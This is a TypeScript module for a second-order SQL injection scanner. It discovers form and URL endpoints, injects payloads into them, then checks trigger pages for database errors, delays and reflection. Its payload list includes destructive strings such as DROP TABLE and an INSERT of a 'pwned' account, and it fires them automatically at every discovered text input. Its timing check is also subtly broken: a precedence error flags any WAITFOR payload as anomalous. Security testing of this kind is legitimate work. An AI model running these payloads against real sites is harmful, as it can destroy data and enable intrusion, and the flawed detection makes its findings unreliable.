import { makeRequest, RequestResult, sleep } from "./utils";
import { generatePayloadVariants } from "./tamping";

export interface SecondOrderTarget {
  storeUrl: string;
  storeMethod: "GET" | "POST";
  storeParam: string;
  triggerUrl: string;
  triggerMethod: "GET" | "POST";
  triggerParam?: string;
  relationship: "direct" | "indirect" | "delayed";
}

export interface SecondOrderResult {
  detected: boolean;
  confidence: number;
  storeUrl: string;
  triggerUrl: string;
  payload: string;
  evidence: string;
  storedSuccessfully: boolean;
  triggeredSuccessfully: boolean;
  errorPatternFound: boolean;
  timingAnomaly: boolean;
}

const SECOND_ORDER_PAYLOADS = [
  "' OR '1'='1",
  "'; DROP TABLE users;--",
  "1'; WAITFOR DELAY '0:0:5'--",
  "admin'--",
  "' UNION SELECT NULL,NULL,NULL--",
  "1' AND SLEEP(5)--",
  "'; INSERT INTO users VALUES('pwned','pwned')--",
  "test@test.com' OR '1'='1",
  "<script>alert(1)</script>'",
  "{{7*7}}",
];

const ERROR_PATTERNS = [
  /SQL syntax.*MySQL/i,
  /Warning.*mysql_/i,
  /PostgreSQL.*ERROR/i,
  /ORA-\d{5}/i,
  /Microsoft.*SQL.*Server/i,
  /sqlite.*error/i,
  /Unclosed quotation mark/i,
  /quoted string not properly terminated/i,
  /SQLSTATE\[/i,
  /syntax error.*at or near/i,
];

export class SecondOrderSQLiDetector {
  private onLog: (level: string, message: string) => Promise<void>;
  private signal?: AbortSignal;
  private storeResponseCache: Map<string, RequestResult> = new Map();
  private onResponse?: (result: RequestResult) => void;

  constructor(
    onLog: (level: string, message: string) => Promise<void>,
    signal?: AbortSignal,
    onResponse?: (result: RequestResult) => void
  ) {
    this.onLog = onLog;
    this.signal = signal;
    this.onResponse = onResponse;
  }
  
  private async request(url: string, options: Parameters<typeof makeRequest>[1] = {}): Promise<RequestResult> {
    const result = await makeRequest(url, options);
    if (this.onResponse) {
      this.onResponse(result);
    }
    return result;
  }

  async detectSecondOrder(targets: SecondOrderTarget[]): Promise<SecondOrderResult[]> {
    const results: SecondOrderResult[] = [];

    for (const target of targets) {
      if (this.signal?.aborted) break;

      await this.onLog("info", `[SecondOrder] Testing store: ${target.storeUrl} -> trigger: ${target.triggerUrl}`);

      for (const basePayload of SECOND_ORDER_PAYLOADS) {
        if (this.signal?.aborted) break;

        const variants = generatePayloadVariants(basePayload, {
          enableMutations: true,
          enableMultiEncoding: false,
          mutationVariants: 2,
        });

        for (const payload of variants.slice(0, 3)) {
          const result = await this.testSecondOrderPayload(target, payload);
          if (result.detected) {
            results.push(result);
            await this.onLog("success", `[SecondOrder] DETECTED: Payload "${payload}" stored at ${target.storeUrl}, triggered at ${target.triggerUrl}`);
            break;
          }
        }
      }
    }

    return results;
  }

  private async testSecondOrderPayload(
    target: SecondOrderTarget,
    payload: string
  ): Promise<SecondOrderResult> {
    const result: SecondOrderResult = {
      detected: false,
      confidence: 0,
      storeUrl: target.storeUrl,
      triggerUrl: target.triggerUrl,
      payload,
      evidence: "",
      storedSuccessfully: false,
      triggeredSuccessfully: false,
      errorPatternFound: false,
      timingAnomaly: false,
    };

    try {
      const storeUrl = this.injectPayloadInUrl(target.storeUrl, target.storeParam, payload);
      const storeOptions: any = {
        method: target.storeMethod,
        timeout: 15000,
        signal: this.signal,
      };

      if (target.storeMethod === "POST") {
        storeOptions.data = `${target.storeParam}=${encodeURIComponent(payload)}`;
        storeOptions.headers = {
          "Content-Type": "application/x-www-form-urlencoded",
        };
      }

      const storeResponse = await this.request(
        target.storeMethod === "GET" ? storeUrl : target.storeUrl,
        storeOptions
      );

      if (storeResponse.status >= 200 && storeResponse.status < 400) {
        result.storedSuccessfully = true;
        this.storeResponseCache.set(`${target.storeUrl}:${payload}`, storeResponse);
      } else {
        return result;
      }

      if (target.relationship === "delayed") {
        await sleep(2000);
      }

      const triggerStartTime = Date.now();
      const triggerResponse = await this.request(target.triggerUrl, {
        method: target.triggerMethod,
        timeout: 30000,
        signal: this.signal,
      });
      const triggerTime = Date.now() - triggerStartTime;

      if (triggerResponse.status >= 200 && triggerResponse.status < 500) {
        result.triggeredSuccessfully = true;

        for (const pattern of ERROR_PATTERNS) {
          if (pattern.test(triggerResponse.body)) {
            result.errorPatternFound = true;
            result.evidence = `Database error detected: ${pattern.source}`;
            result.confidence += 40;
            break;
          }
        }

        if (triggerTime > 4000 && payload.includes("SLEEP") || payload.includes("WAITFOR")) {
          result.timingAnomaly = true;
          result.evidence += ` | Timing anomaly: ${triggerTime}ms response time`;
          result.confidence += 30;
        }

        if (triggerResponse.body.includes(payload) || 
            triggerResponse.body.includes(payload.replace(/'/g, "\\'"))) {
          result.evidence += " | Payload reflection detected";
          result.confidence += 20;
        }

        if (result.confidence >= 40) {
          result.detected = true;
        }
      }

    } catch (error: any) {
      await this.onLog("debug", `[SecondOrder] Error testing payload: ${error.message}`);
    }

    return result;
  }

  private injectPayloadInUrl(url: string, param: string, payload: string): string {
    try {
      const urlObj = new URL(url);
      urlObj.searchParams.set(param, payload);
      return urlObj.toString();
    } catch {
      return url;
    }
  }

  async discoverSecondOrderTargets(
    urls: string[],
    forms: Array<{ action: string; method: string; inputs: Array<{ name: string; type: string }> }>
  ): Promise<SecondOrderTarget[]> {
    const targets: SecondOrderTarget[] = [];

    const storePatterns = [
      /register/i, /signup/i, /create/i, /add/i, /new/i, /insert/i,
      /profile/i, /settings/i, /update/i, /edit/i, /save/i,
      /comment/i, /post/i, /message/i, /feedback/i,
    ];

    const triggerPatterns = [
      /admin/i, /dashboard/i, /view/i, /list/i, /report/i,
      /search/i, /query/i, /export/i, /log/i, /audit/i,
    ];

    const storeUrls = urls.filter(u => storePatterns.some(p => p.test(u)));
    const triggerUrls = urls.filter(u => triggerPatterns.some(p => p.test(u)));

    const storeForms = forms.filter(f => storePatterns.some(p => p.test(f.action)));

    for (const storeUrl of storeUrls) {
      try {
        const urlObj = new URL(storeUrl);
        const params = Array.from(urlObj.searchParams.keys());
        
        for (const param of params) {
          for (const triggerUrl of triggerUrls.slice(0, 5)) {
            targets.push({
              storeUrl,
              storeMethod: "GET",
              storeParam: param,
              triggerUrl,
              triggerMethod: "GET",
              relationship: "indirect",
            });
          }
        }
      } catch {}
    }

    for (const form of storeForms) {
      const textInputs = form.inputs.filter(i => 
        i.type === "text" || i.type === "email" || i.type === "hidden" || !i.type
      );
      
      for (const input of textInputs) {
        for (const triggerUrl of triggerUrls.slice(0, 3)) {
          targets.push({
            storeUrl: form.action,
            storeMethod: form.method.toUpperCase() as "GET" | "POST",
            storeParam: input.name,
            triggerUrl,
            triggerMethod: "GET",
            relationship: "delayed",
          });
        }
      }
    }

    await this.onLog("info", `[SecondOrder] Discovered ${targets.length} potential second-order injection points`);
    return targets;
  }
}
